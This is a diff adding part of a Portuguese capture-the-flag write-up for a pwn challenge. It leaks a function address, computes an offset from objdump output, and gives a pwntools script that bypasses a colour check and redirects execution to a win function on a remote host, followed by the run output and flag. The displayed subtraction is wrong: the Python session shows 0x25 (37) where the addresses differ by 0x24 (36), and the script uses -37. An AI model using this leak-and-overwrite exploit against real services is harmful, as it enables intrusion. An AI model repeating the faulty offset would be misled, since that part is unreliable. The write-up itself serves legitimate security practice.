@@ -121,3 +121,66 @@ if (strcmp(user->color,"red")) {
 
 Temos que burlar a cor para red, isso é fácil já que o fgets ler bytes nulos nós fazeria com`‘red\0’`, cor burlada
 agora vamos ajeitar o caminho do `success_king`
+
+Dando um objdump -t <nome do arquivo> teremos o andress das minhas duas funções `success_king` e `success_knight`
+
+`000000000040084e g     F .text  000000000000002e              success_king`
+`000000000040082a g     F .text  0000000000000024              success_knight`
+
+Agora para calcular o deslocamento basta diminuir o andress de uma função pela outra
+
+``` python
+>>> hex (0x000000000040084e - 0x000000000040082a)
+'0x25'
+>>> 0x25
+37
+```
+
+Temos nossa distancia de uma função para outra, `37`, então, teremos que subtrair do andress do `check_king`
+tendo tudo que precisamos, é hora do solve
+
+```
+from pwn import *
+import struct
+import time
+
+def p(x):
+    return struct.pack("<q", x)
+
+addr = 0
+offset = -37
+
+r = remote('159.203.38.169', 5683)
+r.recv(1024)
+
+print("[*] Triggering leak...")
+r.send('knightAA' + '\n')
+time.sleep(0.3)
+
+print("[*] Retrieving address of check_knight...")
+resp = r.recv(1024).strip()
+addr = resp[8:14] + '\x00\x00'
+addr = struct.unpack("<q", addr)[0]
+
+print("[*] Calculating address of success_king...")
+addr += offset
+
+print("[*] Calling success_king...")
+r.send('red\0' + '0x00' + '0x000000' + p(addr))
+time.sleep(0.3)
+
+resp = r.recv(1024)
+print(resp[resp.find('FLAG'):])
+r.close()
+```
+
+```
+[+] Opening connection to 159.203.38.169 on port 5683: Done
+[*] Triggering leak...
+[*] Retrieving address of check_knight...
+[*] Calculating address of success_king...
+[*] Calling success_king...
+`FLAG{Y0uCr0ss3dTh3Br1g30fD3ath}`
+
+[*] Closed connection to 159.203.38.169 port 5683
+```
